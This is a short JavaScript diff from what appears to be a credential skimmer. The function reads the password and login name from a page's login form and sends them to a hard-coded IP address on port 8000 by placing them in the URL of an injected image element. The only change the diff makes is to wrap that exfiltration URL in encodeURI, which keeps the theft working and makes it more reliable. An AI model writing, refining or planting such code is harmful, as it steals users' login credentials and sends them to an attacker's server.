@@ -11,7 +11,7 @@ function frimframlistener(){
 		pw = frimframdoc.querySelector('#password').value;
 		un = frimframdoc.querySelector('#loginName').value;
 		imag = document.createElement('img');
-		imag.src = 'http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un;
+		imag.src = encodeURI('http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un);
 		document.body.appendChild(imag);
 	}catch(error){
 		console.error(error);
